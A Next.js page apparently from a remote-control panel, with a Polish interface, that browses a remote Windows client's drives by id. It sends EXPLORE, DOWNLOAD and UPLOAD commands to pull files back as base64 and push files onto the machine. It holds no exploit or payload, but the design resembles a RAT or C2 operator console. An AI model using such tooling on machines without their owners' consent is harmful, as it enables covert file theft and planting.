"use client";
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

export default function ExplorerPage({ params }: { params: { id: string } }) {
  const router = useRouter();
  const [clientInfo, setClientInfo] = useState<any>(null);
  const [pathInput, setPathInput] = useState<string>("C:\\");
  const [files, setFiles] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [errorLine, setErrorLine] = useState("");

  const [lastTimestamp, setLastTimestamp] = useState(0);

  const fetchExplorerData = async () => {
    try {
      const res = await fetch('/api/admin');
      const data = await res.json();
      const client = data.clients?.find((c: any) => c.id === params.id);
      if (client) {
        setClientInfo(client);
        if (client.explorerData && client.explorerData.timestamp !== lastTimestamp) {
            setLastTimestamp(client.explorerData.timestamp);
            const normalizedPath = client.explorerData.path.replace(/\\+/g, '\\');
            setPathInput(normalizedPath);
            try {
                const parsed = JSON.parse(client.explorerData.content);
                if (Array.isArray(parsed)) {
                    if (parsed.length > 0 && parsed[0].type === "error") {
                        setErrorLine(parsed[0].name);
                        setFiles([]);
                    } else {
                        setErrorLine("");
                        setFiles(parsed.sort((a: any, b: any) => {
                            if (a.type === 'dir' && b.type === 'file') return -1;
                            if (a.type === 'file' && b.type === 'dir') return 1;
                            return a.name.localeCompare(b.name);
                        }));
                    }
                }
            } catch(e: any) {
                setErrorLine("Błąd parsowania JSON: " + e.message + "\nSurowe dane: " + client.explorerData.content.substring(0, 200));
            }
            setLoading(false);
        }
      }
    } catch(e) {}
  };

  useEffect(() => {
    fetchExplorerData();
    const interval = setInterval(fetchExplorerData, 1000);
    return () => clearInterval(interval);
  }, [params.id]);

  const sendExploreCommand = async (path: string) => {
    setLoading(true);
    await fetch('/api/admin', {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: params.id, message: `EXPLORE:${path}` })
    });
  };

  const downloadFile = async (name: string, e: React.MouseEvent) => {
    e.stopPropagation(); // prevent clicking row
    let current = pathInput;
    if (!current.endsWith('\\')) current += '\\';
    const fullPath = current + name;
    
    setLoading(true);
    await fetch('/api/admin', { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ id: params.id, message: `DOWNLOAD:${fullPath}` }) });
    
    const pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/download?id=${params.id}`);
            const data = await res.json();
            if (data.data?.path === fullPath) {
                clearInterval(pollInterval);
                setLoading(false);
                if (data.data.b64 === "ERROR") { alert("Błąd pobierania pliku! (Brak dostępu lub plik w użyciu)"); return; }
                
                const a = document.createElement('a');
                a.href = `data:application/octet-stream;base64,${data.data.b64}`;
                a.download = name;
                a.click();
            }
        } catch(e) {}
    }, 2000);
  };

  const uploadFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = async () => {
        const b64 = (reader.result as string).split(',')[1];
        let current = pathInput;
        if (!current.endsWith('\\')) current += '\\';
        const fullPath = current + file.name;
        
        setLoading(true);
        await fetch('/api/admin', { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ id: params.id, message: `UPLOAD:${fullPath}:${b64}` }) });
        
        setTimeout(() => sendExploreCommand(pathInput), 2500);
    };
    reader.readAsDataURL(file);
  };

  const goUp = () => {
    let current = pathInput;
    if (current.endsWith('\\') && current.length > 3) {
      current = current.slice(0, -1);
    }
    const lastSlash = current.lastIndexOf('\\');
    if (lastSlash > 0) {
      const newPath = current.substring(0, lastSlash) + '\\';
      setPathInput(newPath);
      sendExploreCommand(newPath);
    }
  };

  useEffect(() => {
    // Send the initial command on mount to fetch C:\
    sendExploreCommand(pathInput);
  }, []);

  // Format bytes
  const formatBytes = (bytes: number) => {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#f8fafc", fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "12px" }}>
      {/* Title Bar like in Windows */}
      <div style={{ 
        backgroundColor: "#e6f0fa", 
        height: "40px", 
        display: "flex", 
        alignItems: "center", 
        justifyContent: "space-between",
        padding: "0 10px",
        borderBottom: "1px solid #dcdcdc"
      }}>
        <div style={{ fontWeight: "bold", color: "#282828", fontSize: "14px", display: "flex", alignItems: "center", gap: "10px" }}>
            <Link href="/" style={{ textDecoration: 'none', color: '#3b82f6' }}>⬅ Panel</Link>
            <span>Menedżer Plików - {params.id}</span>
        </div>
        <div style={{ display: "flex", gap: "5px" }}>
            <button style={{ border: "none", background: "none", fontSize: "16px", cursor: "pointer", color: "#282828" }}>—</button>
            <button style={{ border: "none", background: "none", fontSize: "16px", cursor: "pointer", color: "#282828" }}>🗖</button>
            <button onClick={() => router.push('/')} style={{ border: "none", background: "none", fontSize: "16px", cursor: "pointer", color: "#282828" }}>✖</button>
        </div>
      </div>

      <div style={{ padding: "20px", display: "flex", flexDirection: "column", height: "calc(100vh - 40px)", boxSizing: "border-box" }}>
        {/* Top Control Panel */}
        <div style={{ display: "flex", backgroundColor: "#e6f0fa", padding: "10px", borderRadius: "4px 4px 0 0", gap: "8px" }}>
            <button 
                onClick={goUp}
                title="W górę"
                style={{
                    padding: "4px 12px", border: "1px solid #ccc", background: "#f0f0f0", 
                    borderRadius: "2px", cursor: "pointer", fontSize: "14px"
                }}>
                ⬆️
            </button>
            <input 
                type="text" 
                value={pathInput}
                onChange={(e) => setPathInput(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && sendExploreCommand(pathInput)}
                style={{
                    flex: 1, padding: "4px 8px", border: "1px solid #ccc", borderRadius: "2px",
                    fontSize: "12px", color: "#333", outline: "none"
                }}
            />
        </div>
        
        {/* Toolbar */}
        <div style={{ backgroundColor: "#b4d2f0", padding: "8px 10px", display: "flex", alignItems: "center", gap: "10px" }}>
            <button 
                onClick={() => sendExploreCommand(pathInput)}
                style={{
                    background: "transparent", border: "none", cursor: "pointer", 
                    fontWeight: "bold", fontSize: "14px", color: "#282828", display: "flex", alignItems: "center", gap: "5px"
                }}
            >
                🔄 Odśwież
            </button>
            <div style={{ width: "1px", height: "16px", backgroundColor: "#82aadc" }}></div>
            <label style={{
                background: "transparent", border: "none", cursor: "pointer", 
                fontWeight: "bold", fontSize: "14px", color: "#282828", display: "flex", alignItems: "center", gap: "5px"
            }}>
                📤 Wgraj plik
                <input type="file" onChange={uploadFile} style={{ display: "none" }} />
            </label>
            {loading && <span style={{ fontSize: "12px", color: "#555", marginLeft: "10px" }}>(Ładowanie/Synchronizacja...)</span>}
        </div>

        {/* File Grid */}
        <div style={{ 
            flex: 1, backgroundColor: "#fafcff", border: "1px solid #dcdcdc", borderTop: "none", 
            overflowY: "auto", position: "relative"
        }}>
            {errorLine ? (
                <div style={{ padding: "20px", color: "#ef4444", fontWeight: "bold" }}>{errorLine}</div>
            ) : (
                <table style={{ width: "100%", borderCollapse: "collapse", textAlign: "left" }}>
                    <thead style={{ position: "sticky", top: 0, backgroundColor: "#d2e1f0", boxShadow: "0 1px 0 #ccc" }}>
                        <tr>
                            <th style={{ padding: "8px 10px", width: "40px", borderRight: "1px solid #fff" }}></th>
                            <th style={{ padding: "8px 10px", fontSize: "13px", fontWeight: "bold", color: "#333", borderRight: "1px solid #fff" }}>Ścieżka</th>
                            <th style={{ padding: "8px 10px", fontSize: "13px", fontWeight: "bold", color: "#333", borderRight: "1px solid #fff" }}>Rozmiar / Info</th>
                            <th style={{ padding: "8px 10px", fontSize: "13px", width: "80px" }}></th>
                        </tr>
                    </thead>
                    <tbody>
                        {files.map((f, i) => (
                            <tr key={i} 
                                onClick={() => {
                                    if(f.type === 'dir') {
                                        let current = pathInput;
                                        if (!current.endsWith('\\')) current += '\\';
                                        const newPath = current + f.name;
                                        setPathInput(newPath);
                                        sendExploreCommand(newPath);
                                    }
                                }}
                                style={{ 
                                    borderBottom: "1px solid #f0f0f0", 
                                    cursor: f.type === 'dir' ? "pointer" : "default",
                                    backgroundColor: "transparent",
                                    transition: "background 0.1s"
                                }}
                                onMouseOver={(e) => e.currentTarget.style.backgroundColor = "#e6f0fa"}
                                onMouseOut={(e) => e.currentTarget.style.backgroundColor = "transparent"}
                            >
                                <td style={{ padding: "8px 10px", textAlign: "center", fontSize: "18px" }}>
                                    {f.type === 'dir' ? '📁' : '📄'}
                                </td>
                                <td style={{ padding: "8px 10px", fontSize: "13px", color: "#000000", fontWeight: "500" }}>{f.name}</td>
                                <td style={{ padding: "8px 10px", fontSize: "13px", color: "#555" }}>
                                    {f.type === 'dir' ? '<DIR>' : formatBytes(f.size)}
                                </td>
                                <td style={{ padding: "8px 10px", textAlign: "right" }}>
                                    {f.type === 'file' && (
                                        <button 
                                            onClick={(e) => downloadFile(f.name, e)}
                                            style={{
                                                background: "#3b82f6", color: "white", border: "none", 
                                                borderRadius: "3px", padding: "4px 8px", cursor: "pointer", fontSize: "11px"
                                            }}>
                                            Pobierz
                                        </button>
                                    )}
                                </td>
                            </tr>
                        ))}
                        {files.length === 0 && !loading && !errorLine && (
                            <tr><td colSpan={3} style={{ padding: "20px", textAlign: "center", color: "#888" }}>Pusty folder lub oczekiwanie na dane...</td></tr>
                        )}
                    </tbody>
                </table>
            )}
        </div>
      </div>
    </div>
  );
}
